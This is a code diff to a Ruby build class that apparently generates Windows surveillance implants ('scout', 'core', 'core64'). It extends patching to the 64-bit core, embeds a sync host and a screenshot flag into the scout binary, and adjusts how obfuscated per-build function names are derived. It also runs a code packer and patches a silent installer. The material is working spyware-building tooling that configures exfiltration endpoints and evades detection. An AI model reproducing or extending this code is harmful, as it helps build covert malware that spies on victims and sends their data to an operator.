@@ -37,6 +37,7 @@ class BuildWindows < Build
 
     # patch the core64
     params[:core] = 'core64'
+    params[:config] = nil
     super
 
     # patch the scout
@@ -44,12 +45,16 @@ class BuildWindows < Build
     params[:config] = nil
     super
 
+    trace :debug, "Patching scout for sync and shot"
+
     patch_file(:file => 'scout') do |content|
       host = @factory.configs.first.sync_host
       raise "Sync host not found" unless host
       content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
       content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
     end
+
+    trace :debug, "Patching core function names and registry"
 
     patch_file(:file => 'core') do |content|
       begin
@@ -64,6 +69,8 @@ class BuildWindows < Build
         raise "#{marker} marker not found"
       end
     end
+
+    trace :debug, "Patching core64 function names and registry"
 
     # we have an exception here, the core64 must be patched only with some values
     patch_file(:file => 'core64') do |content|
@@ -87,7 +94,6 @@ class BuildWindows < Build
     patch_build_time('codec')
     patch_build_time('sqlite')
     patch_build_time('silent')
-    patch_build_time('silent_admin')
 
     # code obfuscator
     CrossPlatform.exec path('packer32'), "#{path('core')}"
@@ -187,6 +193,10 @@ class BuildWindows < Build
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
 
+      core_content = z.file.open('core64', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('core64'), "wb") {|f| f.write core_content}
+
       core_content = z.file.open('scout', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
@@ -195,6 +205,9 @@ class BuildWindows < Build
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
     FileUtils.rm_rf Config.instance.temp('core')
+
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core64')}"
+    FileUtils.rm_rf Config.instance.temp('core64')
 
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
     FileUtils.rm_rf Config.instance.temp('scout')
@@ -437,18 +450,15 @@ class BuildWindows < Build
       # take the first letter (ignore nums) of the log key
       # it must be a letter since it's a function name
       first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
-      first_digit = @factory.logkey.match(/[0-9]/)[0]
+      first_digit = @factory.logkey.match(/[0-9]/)[0].to_i
       progressive = ('A'.ord + (first_alpha.ord + first_digit + index) % 26).chr
       @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey + LicenseManager.instance.limits[:magic]).unpack('H*').first[0..7] + progressive
     end
 
-    trace :debug, @funcnames.inspect
-
     (1..12).each do |index|
       find = "PPPFTBBP%02d" % index
 
-      trace :debug, "FUNC: #{find} -> #{@funcnames[index]}"
-      trace :debug, "FUNC NOT FOUND: #{find}" unless content[find]
+      trace :debug, "FUNC: #{find} -> #{@funcnames[index]}" if content[find]
 
       content.binary_patch find, @funcnames[index] if content[find]
     end
